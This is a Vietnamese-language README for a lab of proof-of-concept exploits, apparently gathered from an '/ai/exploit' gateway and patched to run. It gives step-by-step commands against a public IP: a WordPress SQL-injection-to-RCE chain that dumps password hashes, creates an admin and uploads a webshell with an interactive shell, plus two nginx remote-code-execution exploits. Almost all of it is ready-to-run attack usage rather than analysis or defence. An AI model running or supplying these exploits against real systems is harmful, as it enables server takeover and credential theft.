# PoCs Lab — đã sửa chạy được

Các PoC lấy từ gateway `/ai/exploit` sau khi fix để chạy được trên lab
46.250.247.218.

## 1. wp2shell — CVE-2026-60137 + CVE-2026-63030 (WP 6.9.0–6.9.4 SQLi→RCE)

Thư mục `wp2shell/` là 1 Python package. Chạy từ `/home/ict/AIEngines/pocs-lab`.

Các bug đã sửa so với code gốc:
- `exploit.py`: thêm tham số `author: int = 0` vào `wp_posts_tuple()`
- `exploit.py`: thêm field `email` vào dataclass `CreatedAdmin`
- `shell.py`: thêm `_LocalhostRewriteRedirect` để rewrite redirect
  `localhost` → IP thật (vì lab có `siteurl=localhost:8093`)

Target: `46.250.247.218:8093`

```bash
cd /home/ict/AIEngines/pocs-lab

# 1) Check vuln (passive)
python3 -m wp2shell check http://46.250.247.218:8093

# 2) Active SQLi confirm
python3 -m wp2shell check http://46.250.247.218:8093 --confirm-sqli

# 3) Fingerprint DB
python3 -m wp2shell read http://46.250.247.218:8093 --preset fingerprint

# 4) Dump users + password hashes
python3 -m wp2shell read http://46.250.247.218:8093 --preset users

# 5) Full RCE (pre-auth bridge → tạo admin → upload webshell → chạy lệnh)
python3 -m wp2shell shell http://46.250.247.218:8093 --cmd "id; hostname"

# Shell tương tác
python3 -m wp2shell shell http://46.250.247.218:8093 --interactive
```

## 2. Nginx-Rift (stream) — CVE-2026-42533

Chạy thẳng, không cần sửa. Retry nếu lần đầu `heap_ptr=not-found`.

Target: vuln=29443, hold=29444, leak=29445. PoC tự `port+1`/`port+2`.

```bash
cd /home/ict/AIEngines/pocs-lab

# Leak địa chỉ (retry nếu fail)
python3 cve-2026-42533-nginx-rift.py --host 46.250.247.218 --port 29443 --leak

# RCE — ghi file vào webroot /app/html (verify qua HTTP 29444)
python3 cve-2026-42533-nginx-rift.py --host 46.250.247.218 --port 29443 \
  --cmd "id > /app/html/rift_1.txt; hostname >> /app/html/rift_1.txt"
# sau đó: curl http://46.250.247.218:29444/rift_1.txt
```

## 3. Nginx-Rift (HTTP, ASLR off) — CVE-2026-42945

Chạy thẳng. Lab tắt ASLR (`setarch -R`), địa chỉ hardcode sẵn.

Target: `46.250.247.218:19331` (nginx/1.30.0)

```bash
cd /home/ict/AIEngines/pocs-lab

# RCE — worker crash = system() executed
python3 cve-2026-42945-nginx-rift.py --host 46.250.247.218 --port 19331 \
  --cmd "id > /tmp/rce_proof"
```
